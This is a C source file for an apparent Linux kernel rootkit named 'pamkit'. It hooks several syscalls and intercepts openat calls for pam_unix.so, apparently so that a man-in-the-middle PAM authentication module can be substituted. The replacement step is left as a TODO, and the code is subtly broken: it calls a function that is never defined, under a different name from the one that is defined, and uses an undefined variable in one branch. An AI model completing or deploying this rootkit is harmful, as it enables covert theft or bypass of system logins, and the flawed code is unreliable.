#include "syscalls.h"

#pragma GCC optimize("-fno-optimize-sibling-calls")

// TODO: move (and refactor) the logic from 'sys.c' into this file

#define TARGET_PAM_MODULE "pam_unix.so"

static char *
get_filename_from_usr(char __user *str)
{
    char *k_filename = (char *) kzalloc(NAME_MAX * sizeof(char), GFP_KERNEL);
    if (!k_filename) {
        prerr_ratelimited("Failed to allocate buffer to copy filename into kernel space");
        return NULL;
    }

    if (copy_from_user(k_filename, str, NAME_MAX)) {
        prerr_ratelimited("Failed to copy filename from user into kernel space");
        kfree(k_filename);
        return NULL;
    }

    return k_filename;
}

static inline bool
is_pamkit_target_module(int dfd, char *path)
{
    return true;
}


SYSCALL_HOOK(read, unsigned int fd, char __user *buf, size_t count)
{
    long ret = SYSCALL_ORIG_READ(pt_regs, fd, buf, count);
    return ret;
}

SYSCALL_HOOK(open, const char __user *filename, int flags, umode_t mode)
{
    long ret = SYSCALL_ORIG_OPEN(pt_regs, filename, flags, mode);
    return ret;
}

SYSCALL_HOOK(openat, int dfd, const char __user *filename, int flags, umode_t mode)
{
    long ret;

    #ifdef PAMKIT_PTREGS_STUBS
    int arg_dfd = FIRST_ARG(pt_regs, int);
    char *arg_filename = get_filename_from_usr(SECOND_ARG(pt_regs, char *));
    #else
    int dfd_arg = dfd;
    char *arg_filename = get_filename_from_usr(filename);
    #endif

    if (!arg_filename) {
        return SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
    }

    if (!strstr(arg_filename, TARGET_PAM_MODULE)) {
        goto skip_pam_module_replacement;
    }

    /* Do not intercept the module copy used by the MitM module */
    if (is_pamkit_pam_unix(arg_dfd, arg_filename)) {
        kfree(arg_filename);
        return SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
    }

    // TODO:

skip_pam_module_replacement:

    kfree(arg_filename);
    ret = SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
    return ret;
}

SYSCALL_HOOK(newfstatat, int dfd, const char __user *filename, struct stat __user *statbuf, int flag)
{
    long ret = SYSCALL_ORIG_NEWFSTATAT(pt_regs, dfd, filename, statbuf, flag);
    return ret;
}

SYSCALL_HOOK(close, int fd)
{
    long ret = SYSCALL_ORIG_CLOSE(pt_regs, fd);
    return ret;
}

SYSCALL_HOOK(mmap, unsigned long addr, unsigned long len, int prot, int flags, int fd, long off)
{
    long ret = SYSCALL_ORIG_MMAP(pt_regs, addr, len, prot, flags, fd, off);
    return ret;
}

hook_data_t pamkit_syscall_hooks[] = {
    GEN_SYSCALL_HOOK_DATA(read),
    GEN_SYSCALL_HOOK_DATA(open),
    GEN_SYSCALL_HOOK_DATA(openat),
    GEN_SYSCALL_HOOK_DATA(newfstatat),
    GEN_SYSCALL_HOOK_DATA(close),
    GEN_SYSCALL_HOOK_DATA(mmap),
    SYSCALL_HOOK_DATA_EMPTY
};
